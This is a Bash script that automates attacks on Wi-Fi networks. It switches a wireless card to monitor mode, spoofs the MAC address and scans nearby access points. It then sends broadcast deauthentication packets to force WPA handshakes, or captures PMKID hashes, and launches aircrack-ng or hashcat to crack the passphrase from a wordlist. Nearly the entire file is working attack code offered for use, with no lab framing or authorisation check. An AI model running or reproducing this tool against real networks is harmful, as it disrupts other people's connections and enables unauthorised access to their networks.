#!/usr/bin/bash

source config.sh
source dependencies.sh

trap ctrl_c INT

function enable_managed_mode() {
	echo -e "\n${doing}[~]${nc} Taking network card to managed mode..."
	user_sleep
	airmon-ng stop ${network_card} &>/dev/null
	echo -e "${good}[+]${nc} Network card is now in managed mode."
	echo -e "\n${doing}[~]${nc} Restarting network manager..."
	user_sleep
	service network-manager restart &>/dev/null
	service NetworkManager restart &>/dev/null
	service wpa_supplicant restart &>/dev/null
	echo -e "${good}[+]${nc} Network manager restarted."
}

function anonymize_mac_address() {
	echo -e "\n${doing}[~]${nc} Anonymizing MAC address"
	user_sleep
	ifconfig ${network_card} down && macchanger -a ${network_card} &>/dev/null
	ifconfig ${network_card} up &>/dev/null
	macaddress=$(macchanger -s ${network_card} | grep -i "Current" | xargs | cut -d ' ' -f '3-100')
	echo -e "\n${good}[+]${nc} New MAC address: $macaddress"
	user_sleep
}

function enable_monitor_mode() {
	echo -e "\n${doing}[~]${nc} Taking network card to monitor mode"
	airmon-ng start $network_card &>/dev/null
	ifconfig ${network_card}mon &>/dev/null
	if [ "$(echo $?)" == "0" ]; then
		network_card="${network_card}mon"
	fi

	echo -e "\n${good}[+]${nc} Network card in monitor mode"
	user_sleep
	anonymize_mac_address
	echo -e "\n${doing}[~]${nc} Killing processes that could interfer"
	user_sleep
	killall wpa_supplicant dhclient 2>/dev/null
	airmon-ng check kill &>/dev/null
	echo -e "\n${good}[+]${nc} Processes killed correctly"
	user_sleep
}

function kill_remaining_processes() {
	kill -9 $(ps aux | grep -i "airodump-ng" | awk '{print $2}') &>/dev/null
	kill -9 $(ps aux | grep -i "aireplay-ng" | awk '{print $2}') &>/dev/null
	kill -9 $(ps aux | grep -i "hcxdumptool" | awk '{print $2}') &>/dev/null
}

function exit_script() {
	if [ "$we_attack" = "0" ]; then
		echo -e "\n${warn}[*]${nc} We are gonna to exit the script..."
		echo -e "\n${info}[·]${nc} Managed mode allows you to navigate into internet and that stuff. If had finished your attacks it's likeable to bring the network back to managed mode."
		echo -e "\n${info}[·]${nc} If you are cracking some password bring the network card to managed mode, doesn't affect on anything."
		gum confirm "Do you want to bring the network back to managed mode?" && enable_managed_mode || echo -e "\n${yellow}[!]${nc} Leaving network card in monitor mode..."
		echo -e "\n${info}[·]${nc} I specially recommend you to kill the remaining processes if you use a PMKID attack, because I found that hcxdumptool doesn't kill itself for some reason..."
		echo -e "\n${info}[·]${nc} You could also verify this with the command: ${cmd}ps aux | grep -i \"hcxdumptool\"${nc}"
		gum confirm "Do you want to kill remaining processes?" && kill_remaining_processes || echo -e "\n${yellow}[!]${nc} Leaving remaining processes running..."
		gum confirm "Do you want to delete all the temporary files? (dump files, etc)" && delete_temp_files || echo -e "\n${yellow}[!]${nc} Leaving temporary files..."
	fi
	echo -e "\n${good}[+]${nc} Exiting..."
	tput cnorm 2>/dev/null
	exit 0
}

function ctrl_c() {
	exit_script
}

function help_panel() {
	echo -e "Usage: ${good}$0 ${info}-a attack_mode"
	echo -e "\ta) Attack mode"
	echo -e "\t${nc}Available attack modes:"
	echo -e "\t\t${info}PMKID"
	echo -e "\t\tHandshake"
	echo -e "\t${info}n) Change network card mode"
	echo -e "\t${nc}Available network card modes:"
	echo -e "\t\t${info}managed"
	echo -e "\t\tmonitor"
	echo -e "\t${doing}h) Help panel"
	echo -e "\tShow this help panel"
	echo -e "\n\t${cmd}Example: $0 -a PMKID${nc}"

	exit_script
}

function do_not_close_sign() {
	gum style "Do not close the new terminal, the script will close it automagically later"
}

function user_sleep() {
	# This function is to set the user read sleep, to not spam the screen with a lot of messages very fast
	sleep 0.5
}

function delete_temp_files() {
	rm -rf airodump*
	rm -rf capture_*
}

function select_target_network() {
	echo -e "\n${yellow}[*]${nc} Now we are going to scan the networks around you..."
	echo -e "${yellow}[*]${nc} A new terminal will be opened to show you the networks around you"

	airodump_file="airodump-dump"

	xterm -hold -e "airodump-ng ${network_card} -w ${airodump_file} --write-interval 1 --output-format csv" &
	airodump_xterm_pid=$!

	do_not_close_sign
	echo -e "${yellow}[*]${nc} Wait a few seconds and pause the scan with ${good}enter${nc}..."
	wait_for_confirmation
	kill -9 $airodump_xterm_pid
	wait $airodump_xterm_pid &>/dev/null

	cat ${airodump_file}-01.csv | grep -Ev ", OPN, " >airodump-dump-filtered-open.csv
	# Eliminamos las primera linea del archivo
	sed -i '1,2d' ${airodump_file}-01.csv
	# Eliminamos las lineas donde se encuentran los clientes, para dejar solo las redes
	sed -i '/Station MAC/,$d' ${airodump_file}-01.csv
	# Atajamos posibles typos que puedan haber
	sed -i 's/2,4/2.4/g' ${airodump_file}-01.csv
	sed -i 's/5,8/5.8/g' ${airodump_file}-01.csv

	network_list=()
	while IFS= read -r line; do
		network_list+=("$line")
	done < <(cut -d ',' -f14,4,6,8,1 airodump-dump-filtered-open.csv)

	target_network=$(gum choose "${network_list[@]}")

	ssid="${target_network##*, }"
	bssid="${target_network%%,*}"
	channel="$(echo "$target_network" | awk -F', ' '{print $2}')"

	echo -e "\n${good}[+]${nc} You choose ${yellow}${bssid}${nc} on channel ${yellow}${channel}${nc} with the name ${yellow}${ssid}${nc}"
	rm -rf airodump*
	handshake
}

function handshake() {
	gum style "Attacking $ssid"
	echo -e "\n${doing}[~]${nc} Listening network traffic of ${bssid} on channel ${channel}"
	user_sleep
	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show you the traffic of the network"
	user_sleep
	do_not_close_sign
	user_sleep
	xterm -hold -e "airodump-ng -c $channel -w "capture_${bssid}" --bssid "${bssid}" ${network_card}" &
	airodump_filter_xterm_pid=$!

	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to send the deauth packets"
	user_sleep
	do_not_close_sign
	user_sleep
	echo -e "\n${doing}[~]${nc} Deauthenticating all clients..."
	user_sleep
	xterm -hold -e "aireplay-ng -0 5 -a ${bssid} -c ff:ff:ff:ff:ff:ff ${network_card}" &
	aireplay_xterm_pid=$!

	sleep 10 # Waiting deauthentication
	kill -9 $aireplay_xterm_pid
	wait $aireplay_xterm_pid &>/dev/null
	echo -e "\n${green}[+]${nc} Signal for deauthenticate all clients sended"

	handshake_wait=60
	echo -e "\n${doing}[~]${nc} Waiting handshake for ${handshake_wait} seconds..."

	sleep ${handshake_wait}

	tshark -r capture_${bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null

	if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
		echo -e "\n${good}[+]${nc} Handshake captured"
		kill -9 $airodump_filter_xterm_pid
		wait $airodump_filter_xterm_pid &>/dev/null
	else
		echo -e "\n${wrong}[-]${nc} Handshake could not be captured"
		echo -e "\n${yellow}[*]${nc} You could wait until the handshake is captured or press ${ask}enter${nc} to continue"
		echo -e "\n${info}[·]${nc} TIP: You can try to see the clients and send the deauth packets to them using aireplay in another terminal: "
		echo -e "${cmd}sudo aireplay-ng -0 5 -a ${bssid} -c client_mac_address ${network_card}"
		echo -e "${cmd}sudo aireplay-ng -0 5 -a ${bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"
		wait_for_confirmation
		tshark -r capture_${bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
		if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
			echo -e "\n${good}[+]${nc} Handshake captured"
			kill -9 $airodump_filter_xterm_pid
			wait $airodump_filter_xterm_pid &>/dev/null
		else
			echo -e "\n${wrong}[-]${nc} Handshake could not be captured"
			kill -9 $airodump_filter_xterm_pid
			wait $airodump_filter_xterm_pid &>/dev/null
			echo -e "\n${wrong}[-]${nc} The failed captures will be deleted"
			rm -rf capture_*
			gum confirm "Do you want to try again? on the same network?" && handshake || gum confirm "Do you want to try again on another network?" && select_target_network
		fi
	fi
	tshark -r capture_${bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
	if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
		mkdir -p handshakes
		mv capture_* handshakes/

		xterm -hold -e "aircrack-ng -w $wordlist_path handshakes/capture_${bssid}-01.cap" &
		aircrack_xterm_pid=$!
		echo -e "\n${yellow}[*]${nc} Cracking handshake..."
		echo -e "\n${yellow}[!]${nc} Remember to kill the process when you have the password"
		echo -e "\n${yellow}[!]${nc} Use the following command: ${cmd}sudo kill -9 $aircrack_xterm_pid${nc}"
	fi

	rm -rf handshake.txt

}

function pmkid() {
	echo -ne "\n${ask}[?]${nc} How many minutes do you want to listen? [Recommended: 1]: " && read minutes
	echo -e "\n${doing}[~]${nc} Start listening at $(date +%H:%M:%S)..."
	xterm -hold -e "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid" &
	hcxdumptool_xterm_pid=$!
	hcxdumptool_hang_process=$(ps aux | grep "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid" | grep -v "xterm" | awk '{print $2}')
	sleep -m "$minutes"
	echo -e "\n${doing}[~]${nc} Stop listening at $(date +%H:%M:%S)..."
	kill -9 $hcxdumptool_xterm_pid &>/dev/null
	wait $hcxdumptool_xterm_pid &>/dev/null
	sleep 5
	kill -9 $hcxdumptool_hang_process &>/dev/null
	wait $hcxdumptool_hang_process &>/dev/null
	echo -e "\n${doing}[~]${nc} Obtaining hashes..."
	hash_name="hashes_pmkid_$(date +%y_%m_%d_%H_%M).hc22000"
	hcxpcapngtool -o ${hash_name} capture_pmkid 1>/dev/null
	rm -rf capture_pmkid &>/dev/null
	mkdir -p hashes_pmkid
	mv hashes_pmkid* hashes_pmkid &>/dev/null
	user_sleep

	test -f "hashes_pmkid/${hash_name}"

	if [ "$(echo $?)" == "0" ]; then
		echo -e "\n${good}[+]${nc} Hashes obtained"
		user_sleep
		echo -e "\n${doing}[~]${nc} Initiating brute-force attack..."
		user_sleep
		echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show the progress of the attack"
		xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} $wordlist_path" &
		hashcat_xterm_pid=$!
		echo -e "\n${yellow}[*]${nc} Remember to kill this terminal when the cracking were finished"
		echo -e "\n${info}[·]${nc} Use the following command: ${cmd}sudo kill -9 $hashcat_xterm_pid${nc}"
	else
		echo -e "\n${wrong}[!]${nc} The hashes are not captured :("
		gum confirm "Do you want to retry?" && pmkid
	fi
}

function attack() {
	#clear
	choose_network_card

	echo -e "${info}[·]${nc} Starting ${attack_mode} attack with $network_card network card"

	enable_monitor_mode

	if [[ "${attack_mode,,}" == "handshake" ]]; then
		select_target_network
	elif [[ "${attack_mode,,}" == "pmkid" ]]; then
		pmkid
	else
		echo -e "${wrong}[-]${nc} Invalid attack mode"
		exit_script
	fi

}

function choose_network_card() {
	network_cards=()
	while IFS= read -r line; do
		network_cards+=("$line")
	done < <(ifconfig | awk '{print $1}' | grep : | sed 's/://')
	network_card=$(gum choose "${network_cards[@]}")
	we_attack=0
}

function wait_for_confirmation() {
	echo -ne "\n${ask}[?]${nc} Press ${ask}any key${nc} to continue..." && read
}
# Main function

tput civis 2>/dev/null
we_attack=1
echo ""
while getopts ":a:n:hd" arg; do
	case $arg in
	a) attack_mode=$OPTARG ;;
	n) network_card_mode=$OPTARG ;;
	d) see_all_dependencies ;;
	h) help_panel ;;
	?)
		echo -e "${wrong}[!]${nc} Invalid option: -$OPTARG\n"
		help_panel
		;;
	esac
done

if [ "$(id -u)" == "0" ]; then

	if [[ $network_card_mode == "monitor" ]]; then
		choose_network_card
		enable_monitor_mode
		exit_script
	elif [[ $network_card_mode == "managed" ]]; then
		choose_network_card
		enable_managed_mode
		exit_script
	fi

	if [ -z "$attack_mode" ]; then
		echo -e "${wrong}[!]${nc} Missing arguments!\n"
		help_panel
	fi

	dependencies
	attack
	exit_script
else
	echo -e "${wrong}[!]${nc} You must be root to run this script"
	exit_script
fi
